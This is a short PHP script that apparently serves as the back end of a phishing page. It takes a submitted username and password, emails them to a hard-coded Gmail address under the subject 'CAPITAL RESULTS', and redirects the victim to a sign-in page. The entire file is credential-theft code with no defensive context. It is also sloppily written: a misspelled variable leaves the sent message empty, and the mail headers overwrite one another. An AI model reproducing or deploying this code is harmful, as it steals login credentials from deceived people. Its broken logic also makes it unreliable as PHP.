<?php





$username = $_POST['noAcctUid'];

$password = $_POST['noAcctPw'];



if($username==is_null($username) || $password==is_null($password)){

	

	

header("Location:SignIn.htm");

	

	

	

}



else{

	

	$to = 'wagba101@gmail.com';

	$subject = ' CAPITAL RESULTS';

	$message = "EMAIL:" . $username."  PASSWORD".$password;

	

	

	$headers ='From: '.$username.''.'\n\n';

	$headers ="MIME-Version: 1.0 \r\n";

	$headers ="Content-type: text/html \r\n";

	

	mail($to,$subject,$mesage,$headers);

	

	header("Location:SignIn.htm");

	

}























?>